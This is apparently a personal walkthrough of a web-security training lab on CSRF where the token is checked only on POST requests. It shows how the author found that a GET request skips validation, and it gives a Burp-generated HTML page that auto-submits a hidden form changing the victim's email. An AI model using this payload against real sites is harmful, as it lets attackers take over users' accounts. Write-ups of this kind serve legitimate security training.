# Practitioner Lab 78 : CSRF where token validation depends on request method

---

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials:Â `wiener:peter`

I start this lab by looking at the functionality of the lab and seeing when a CSRF token is needed for me to change the email.

![Untitled](Practitioner%20Lab%2078%20CSRF%20where%20token%20validation%20de%20e525860113d746e6864c6d09a90cf569/Untitled.png)

I can see that when a post is made I need to use the CSRF token but what about any other methods?

![Untitled](Practitioner%20Lab%2078%20CSRF%20where%20token%20validation%20de%20e525860113d746e6864c6d09a90cf569/Untitled%201.png)

Here I can see the allowed methods are GET and POST so now I will try to do a GET request to see if it needed.

![Untitled](Practitioner%20Lab%2078%20CSRF%20where%20token%20validation%20de%20e525860113d746e6864c6d09a90cf569/Untitled%202.png)

This seems to have worked and when I check my page it did work. So now I will use this to do a CSRF attack.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2900400400aeb3818d5216006000ae.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attackedBY&#64;me" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

After using the following payload on the Exploit server I was able to solve the lab.

![Untitled](Practitioner%20Lab%2078%20CSRF%20where%20token%20validation%20de%20e525860113d746e6864c6d09a90cf569/Untitled%203.png)